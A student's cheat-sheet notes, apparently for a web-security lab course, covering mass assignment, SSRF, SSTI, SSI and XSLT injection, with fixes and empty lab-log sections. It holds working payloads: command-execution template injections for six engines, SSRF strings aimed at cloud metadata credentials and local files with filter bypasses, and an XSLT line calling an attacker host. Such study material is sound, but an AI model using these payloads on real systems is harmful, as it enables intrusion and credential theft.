# Web Attacks

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Advanced web attacks (HTTP verb tampering, IDOR, XXE, and related logic flaws).

## Mass Assignment (reference)
Framework binds user-supplied request params straight onto a model/object without a whitelist, so an attacker adds extra params (e.g. `admin=true`, `confirmed=1`) to set fields they shouldn't control → **privilege escalation / approval bypass / unauthorized data change**.

**Exploit = parameter tampering.** Add unexpected fields to the request body:
```http
POST /register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=newuser&password=pw123&confirmed=1     # sets an attribute the app meant to control
```
Rails example: `User.new(params[:user])` + sending `admin=true`.

**Fix = whitelist the fields:**
- Rails strong params: `params.require(:user).permit(:username, :email)`
- Laravel: `protected $fillable = ['username','email'];` (not `$guarded = []`)
- Express/Sequelize: build the object from named fields, not `req.body` wholesale

**Finding it:** look for register/profile/update endpoints, compare the object's full field list (from source or responses) against what the form sends, then try adding the privileged fields. Real cases: GitHub 2012, Shopify admin panel.

## Server-side injection (reference)
Payloads below run `id` as a benign proof — swap for the real target action in a test.

### SSRF (Server-Side Request Forgery)
Make the server fetch a URL you control → reach internal services / cloud metadata / local files.
```text
http://127.0.0.1:<port>/        # internal port scan / reach localhost-only services
file:///etc/passwd              # local file read
http://169.254.169.254/latest/meta-data/   # AWS metadata (creds!) ; GCP: metadata.google.internal
gopher://<host>:<port>/_<raw>   # craft arbitrary TCP (e.g. to Redis/SMTP)
dict:// , ftp:// , php:// , data://
```
Filter bypasses: URL/double-encoding (`127.0.0.1%3A80`, `%253A`), octal `0177.0.0.1`, hex `0x7f.0.0.1`, IPv6 `[::1]`, DNS rebinding, odd ports. **Impact:** internal recon, cloud cred theft, SSRF→RCE via gopher.

### SSTI (Server-Side Template Injection)
Detect: inject `${{<%[%'"}}%\` and watch for errors / math eval (`{{7*7}}` → 49). Then by engine:
```text
Jinja2 (Python): {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
Twig (PHP):      {{['id']|filter('system')}}   (or {{system('id')}} on old)
Freemarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
Velocity (Java): #set($x=$e.class.forName('java.lang.Runtime')...exec('id'))
Smarty (PHP):    {system('id')}
Handlebars (JS): constructor.constructor('return process...child_process.execSync("id")')()
```
Blind: timing / OOB (Burp Collaborator). **Impact:** usually full RCE.

### SSI injection (.shtml)
```text
<!--#exec cmd="id" -->          # command exec
<!--#include file="/etc/passwd" -->
<!--#echo var="DATE_LOCAL" -->
```

### XSLT injection
```text
<xsl:value-of select="system-property('xsl:version')" />          # info disclosure
<xsl:value-of select="unparsed-text('/etc/passwd','utf-8')" />    # LFI
<xsl:value-of select="php:function('system','id')" />             # RCE (PHP-XSLT)
document('http://<attacker>/x.xml')                                # SSRF/XXE
```

**Finding/testing tools:** `wfuzz -c -z file,wl.txt http://t/FUZZ`, Burp, ffuf; confirm reflection points then try the engine-specific payloads.
**Fix:** input whitelisting, don't pass user input into templates/URLs/XSL, sandbox the engine, block cloud-metadata IPs, output encoding, least privilege.

> SSRF and SSTI are the heavy hitters: SSRF → cloud creds (169.254.169.254) is a top real-world finding, and SSTI is near-always RCE once you ID the engine. Fingerprint the engine first (the `{{7*7}}` vs `${7*7}` test), then fire the matching payload.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
